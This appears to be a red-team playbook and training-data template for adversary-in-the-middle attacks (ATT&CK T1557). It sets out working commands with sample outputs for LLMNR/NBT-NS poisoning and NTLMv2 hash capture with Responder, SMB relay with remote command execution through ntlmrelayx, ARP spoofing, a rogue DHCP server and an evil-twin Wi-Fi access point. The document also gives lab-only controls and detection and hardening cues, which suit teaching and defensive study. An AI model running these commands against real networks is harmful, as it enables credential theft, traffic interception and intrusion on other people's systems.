# Adversary-in-the-Middle Playbook (ATT&CK T1557, Dataset-Ready)

> Purpose: provide realistic, high-value AiTM training data with commands, tool outputs, and analyst interpretation.
> Scope: authorized lab and sanctioned exercises only.

Adversary-in-the-Middle (AiTM) focuses on positioning between communicating systems to capture or manipulate traffic.

- ATT&CK Technique ID: T1557
- Name: Adversary-in-the-Middle
- Sub-techniques in scope: T1557.001, T1557.002, T1557.003, T1557.004

---

## 0. Safety and Lab Controls

1. Use only an isolated lab segment (no production hosts).
2. Use test accounts and synthetic data.
3. Explicitly document start/stop times of interception.
4. Revert ARP, DHCP, and Wi-Fi changes after each test.
5. Keep full packet capture for validation and model labeling.

### 0.1 Evidence Wrapper

```bash
mkdir -p evidence

run_aitm() {
  local technique="$1"
  local label="$2"
  shift 2
  local ts
  ts="$(date -u +%Y%m%dT%H%M%SZ)"
  echo "[$ts] [$technique] $label" | tee -a evidence/aitm.log
  "$@" 2>&1 | tee "evidence/${ts}_${technique}_${label}.txt"
}
```

### 0.2 Training Record Schema

```json
{
  "technique": "T1557.002",
  "technique_name": "ARP Cache Poisoning",
  "scenario": "Operator performs MITM between workstation and gateway in isolated VLAN",
  "command": "arpspoof -i eth0 -t 10.20.30.15 10.20.30.1",
  "tool_result": {"status":"success", "highlights":["victim ARP updated", "traffic observed via attacker host"]},
  "analyst_interpretation": "Layer-2 redirection succeeded; inspect for credential exposure over cleartext protocols",
  "confidence": 0.95,
  "mitigation_hint": "Enable DHCP snooping + dynamic ARP inspection + encrypted protocols"
}
```

---

## 1. Baseline Before AiTM

Scenario:
- Capture normal traffic paths and resolver behavior before introducing spoofing.

```bash
run_aitm "T1557" "baseline_network" sh -lc 'ip route; arp -an | head -n 10; ss -tunap | head -n 20'
```

Example result:

```text
default via 10.20.30.1 dev eth0
? (10.20.30.1) at 00:11:22:33:44:55 [ether] on eth0
tcp ESTAB 0 0 10.20.30.15:49722 10.20.30.20:445 users:("system",pid=4,fd=61)
```

Analyst note:
- Keep baseline artifacts for before/after comparison when labeling successful AiTM actions.

---

## 2. T1557.001 LLMNR/NBT-NS Poisoning and SMB Relay

Scenario:
- Victim attempts name resolution for a non-existent host; attacker poisons response and coerces SMB auth.

### Command Path A: Poisoning and Credential Collection (Responder)

```bash
run_aitm "T1557.001" "responder_poison" sudo responder -I eth0 -rdwv
```

Example result:

```text
[+] Poisoners: LLMNR [ON]  NBT-NS [ON]  mDNS [ON]
[SMB] NTLMv2-SSP Hash captured from CORP\\j.dupont :: 10.20.30.15
```

### Command Path B: SMB Relay (ntlmrelayx)

```bash
run_aitm "T1557.001" "smb_relay" sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

Example result:

```text
[*] SMBD-Thread-4: Connection from 10.20.30.15, attacking target smb://10.20.30.25
[+] Executed specified command on host: 10.20.30.25
corp\\svc_backup
```

Tooling:
- responder
- impacket-ntlmrelayx
- tcpdump/tshark for evidence correlation

Detection and hardening cues:
- Alert on LLMNR/NBT-NS responses from non-authoritative endpoints.
- Enforce SMB signing and disable LLMNR where possible.

---

## 3. T1557.002 ARP Cache Poisoning

Scenario:
- Adversary inserts itself between victim and gateway using forged ARP replies.

### Step 1: Enable Forwarding on Attacker Host (lab only)

```bash
run_aitm "T1557.002" "enable_forwarding" sudo sysctl -w net.ipv4.ip_forward=1
```

Example:

```text
net.ipv4.ip_forward = 1
```

### Step 2: Poison Victim and Gateway ARP Caches

```bash
run_aitm "T1557.002" "arp_spoof_victim" sudo arpspoof -i eth0 -t 10.20.30.15 10.20.30.1
run_aitm "T1557.002" "arp_spoof_gateway" sudo arpspoof -i eth0 -t 10.20.30.1 10.20.30.15
```

### Step 3: Observe Relayed Traffic

```bash
run_aitm "T1557.002" "sniff_http" sudo tcpdump -ni eth0 host 10.20.30.15 and '(tcp port 80 or tcp port 445)'
```

Example result:

```text
ARP, Reply 10.20.30.1 is-at aa:bb:cc:dd:ee:ff
IP 10.20.30.15.49812 > 10.20.30.1.80: Flags [P.], length 512
```

Cleanup:

```bash
sudo pkill arpspoof
sudo sysctl -w net.ipv4.ip_forward=0
```

Detection and hardening cues:
- Alert on duplicate gateway MAC mappings and ARP churn.
- Enable dynamic ARP inspection and switch port security.

---

## 4. T1557.003 DHCP Spoofing

Scenario:
- Rogue DHCP server returns attacker-controlled DNS/gateway to redirect traffic.

### Step 1: Run Rogue DHCP Service (isolated lab only)

```bash
cat >/tmp/rogue-dhcp.conf <<'EOF'
interface=eth0
dhcp-range=10.20.30.100,10.20.30.150,12h
dhcp-option=3,10.20.30.50
dhcp-option=6,10.20.30.50
log-dhcp
EOF

run_aitm "T1557.003" "rogue_dhcp" sudo dnsmasq --no-daemon --conf-file=/tmp/rogue-dhcp.conf
```

Example result:

```text
dnsmasq-dhcp: DHCPDISCOVER(eth0) 74:56:3c:11:22:33
dnsmasq-dhcp: DHCPOFFER(eth0) 10.20.30.112 74:56:3c:11:22:33
```

### Step 2: Validate Offer Source from Packet Capture

```bash
run_aitm "T1557.003" "dhcp_offer_verify" sudo tshark -i eth0 -Y 'bootp.type==2' -T fields -e ip.src -e bootp.yiaddr
```

Example result:

```text
10.20.30.50 10.20.30.112
```

Detection and hardening cues:
- DHCP snooping with trusted/untrusted ports.
- Alert on unauthorized DHCP OFFER/ACK senders.

---

## 5. T1557.004 Evil Twin

Scenario:
- Adversary stands up a fake AP with trusted SSID to intercept user traffic.

### Step 1: Start Access Point with Cloned SSID

```bash
cat >/tmp/evil_twin_hostapd.conf <<'EOF'
interface=wlan0
ssid=Corp-Guest
channel=6
hw_mode=g
auth_algs=1
wpa=2
wpa_passphrase=TrainingOnly123!
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

run_aitm "T1557.004" "evil_twin_ap" sudo hostapd /tmp/evil_twin_hostapd.conf
```

Example result:

```text
wlan0: AP-ENABLED
wlan0: STA 90:9f:33:aa:bb:cc IEEE 802.11: associated
```

### Step 2: Observe Victim Association and DNS Requests

```bash
run_aitm "T1557.004" "evil_twin_capture" sudo tcpdump -ni wlan0 'port 53 or port 80 or port 443'
```

Example result:

```text
IP 10.20.40.12.53412 > 10.20.40.1.53: A login.corp.local
IP 10.20.40.12.49822 > 10.20.40.20.443: TLS ClientHello
```

Detection and hardening cues:
- Wireless IDS for duplicate SSID/BSSID anomalies.
- 802.1X/EAP-TLS and strict certificate validation.

---

## 6. Label-Ready Examples (JSONL)

```json
{"technique":"T1557.001","command":"responder -I eth0 -rdwv","result":"Captured NTLMv2 challenge-response","interpretation":"Name resolution poisoning enabled credential collection"}
{"technique":"T1557.002","command":"arpspoof -i eth0 -t 10.20.30.15 10.20.30.1","result":"Victim ARP entry changed to attacker MAC","interpretation":"Traffic path was redirected through attacker"}
{"technique":"T1557.003","command":"dnsmasq --no-daemon --conf-file=/tmp/rogue-dhcp.conf","result":"Victim received attacker-controlled DNS/gateway","interpretation":"Rogue DHCP successfully influenced routing"}
{"technique":"T1557.004","command":"hostapd /tmp/evil_twin_hostapd.conf","result":"Client associated to fake Corp-Guest AP","interpretation":"Evil Twin positioned for sniffing/manipulation"}
```

---

## 7. Coverage Checklist

- T1557 Adversary-in-the-Middle
- T1557.001 LLMNR/NBT-NS Poisoning and SMB Relay
- T1557.002 ARP Cache Poisoning
- T1557.003 DHCP Spoofing
- T1557.004 Evil Twin

This document is optimized for training corpus generation: scenario + command + output + interpretation + mitigation cues.
